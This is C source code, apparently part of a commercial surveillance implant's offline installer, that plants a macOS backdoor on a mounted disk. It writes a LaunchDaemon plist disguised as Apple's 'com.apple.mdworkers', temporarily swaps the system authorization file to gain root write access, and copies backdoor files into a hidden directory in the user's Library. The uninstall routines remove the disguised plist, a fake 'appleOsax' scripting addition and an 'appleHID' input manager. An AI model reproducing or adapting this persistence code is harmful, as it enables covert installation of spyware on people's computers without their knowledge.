#include "stdafx.h"
#include "Functions_Users.h"
#include "commons.h"

#define TEMPORARY_LOADER L"4872364829"

char _mdworker_content[]=	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
							"<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
							"<plist version=\"1.0\">"
							"<dict>"
							"<key>Label</key>"
							"<string>com.apple.mdworkers.%S</string>"
							"<key>ProgramArguments</key>"
							"<array>"
							"<string>%S/Library/Preferences/%S_/%S</string>"
							"<string>%S</string>"
							"<string>%S</string>"
							"<string>%S</string>"
							"</array>"
							"<key>KeepAlive</key>"
							"<dict>"
							"<key>SuccessfulExit</key>"
							"<false/>"
							"</dict>"
							"</dict>"
							"</plist>";

#define BUFFER_SIZE 10000
BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path, BOOL destMustExist)
{
	BYTE *buffer;
	HANDLE hs, hd; 
	DWORD read, write;

	buffer = (BYTE *)malloc(BUFFER_SIZE);
	if (!buffer)
		return FALSE;

	hs = CreateFile(source_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hs == INVALID_HANDLE_VALUE) {
		SAFE_FREE(buffer);
		return FALSE;
	}

	if (destMustExist) 
		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	else
		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hd == INVALID_HANDLE_VALUE) {
		CloseHandle(hs);
		SAFE_FREE(buffer);
		return FALSE;
	}

	while(ReadFile(hs, buffer, BUFFER_SIZE, &read, NULL) && read!=0) {
		if (!WriteFile(hd, buffer, read, &write, NULL) || write!=read) {
			CloseHandle(hs);
			CloseHandle(hd);
			SAFE_FREE(buffer);
			return FALSE;
		}
	}

	SetEndOfFile(hd);
	CloseHandle(hs);
	CloseHandle(hd);
	SAFE_FREE(buffer);
	return TRUE;
}

HANDLE CreateRootFile(os_struct_t *os_info)
{
	WCHAR source_path[MAX_PATH], dest_path[MAX_PATH];

	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization", os_info->drive);
	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\authorization.bu", os_info->drive);
	if (!CopyFile(source_path, dest_path, FALSE))
		return INVALID_HANDLE_VALUE;

	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\authorization.mod", os_info->drive);
	MoveFile(source_path, dest_path);
	return CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, TRUNCATE_EXISTING, NULL, NULL);
}

BOOL SaveRootFile(HANDLE hfile, WCHAR *plist_path, os_struct_t *os_info, BOOL success)
{
	WCHAR source_path[MAX_PATH], dest_path[MAX_PATH];

	CloseHandle(hfile);
	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\authorization", os_info->drive);
	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization.bu", os_info->drive);
	CopyFile(source_path, dest_path, FALSE);
	DeleteFile(source_path);

	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization.mod", os_info->drive);

	if (success) 
		return MoveFile(source_path, plist_path);
	else
		return DeleteFile(source_path);
}

void MAC_GetSourceFileDirectory(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info, WCHAR *src_path) 
{
	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s.app", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
}

BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR tmp_path[MAX_PATH*2];
	WCHAR tmp_path2[MAX_PATH*2];
	HANDLE hFind, hfile;
	WIN32_FIND_DATA file_info;
	DWORD w_len;

	WCHAR temp_backdoor_path[MAX_PATH];
	WCHAR plist_path[MAX_PATH];

	char mdworker_plist_content[2048];

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	// hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, user_info->user_home, rcs_info->hdir);
	sprintf_s(mdworker_plist_content, sizeof(mdworker_plist_content), _mdworker_content, user_info->user_name, user_info->user_home, rcs_info->hdir, TEMPORARY_LOADER, user_info->user_name, rcs_info->hdir, rcs_info->hcore);
	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.mdworkers.%s.plist", os_info->drive, user_info->user_name);

	// Crea la directory temporanea
	ClearAttributes(temp_backdoor_path);
	if (!CreateDirectory(temp_backdoor_path, NULL) && (GetLastError()!=ERROR_ALREADY_EXISTS)) 
		return FALSE;

	// Crea l'mdworker per il primo avvio
	hfile = CreateRootFile(os_info);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
		
	if (!WriteFile(hfile, mdworker_plist_content, strlen(mdworker_plist_content), &w_len, NULL) || w_len!=strlen(mdworker_plist_content)) {
		SaveRootFile(hfile, plist_path, os_info, FALSE);
		return FALSE;
	}
	if (!SaveRootFile(hfile, plist_path, os_info, TRUE))
		return FALSE;

	// Crea un marker nella directory temporanea
	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\00", temp_backdoor_path);
	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Copia i file nella directory temporanea
	swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\*", rcs_info->rcs_files_path);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
			swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", temp_backdoor_path, file_info.cFileName);
			
			ClearAttributes(tmp_path2);
			if (!SafeCopyFile(tmp_path, tmp_path2, FALSE)) {
				FindClose(hFind);
				return FALSE;
			}
		} while (FindNextFile(hFind, &file_info));
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			FindClose(hFind);
			return FALSE;
		}
		FindClose(hFind);
	} else
		return FALSE;

	return TRUE;
}

BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR backdoor_path[MAX_PATH];

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	// Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
	swprintf_s(backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
	DeleteDirectory(backdoor_path);

	// Cancella il plist del primo avvio (se la bacdkoor non ha mai runnato)
	swprintf_s(backdoor_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.mdworkers.%s.plist", os_info->drive, user_info->user_name);
	DeleteFile(backdoor_path);

	// Cancella il plist della backdoor
	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.mdworker.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
	ClearAttributes(backdoor_path);
	DeleteFile(backdoor_path);

	// Cancella tutti i file e la directory
	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
	DeleteDirectory(backdoor_path);

	return TRUE;
}


BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *users_list_head)
{
	return TRUE;
}

BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *users_list_head, DWORD installation_count)
{
	WCHAR backdoor_path[MAX_PATH];

	// Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
	if (installation_count == 0) {
		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\appleOsax", os_info->drive);
		DeleteDirectory(backdoor_path);
		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\InputManagers\\appleHID", os_info->drive);
		DeleteDirectory(backdoor_path);
	}
	return TRUE;
}
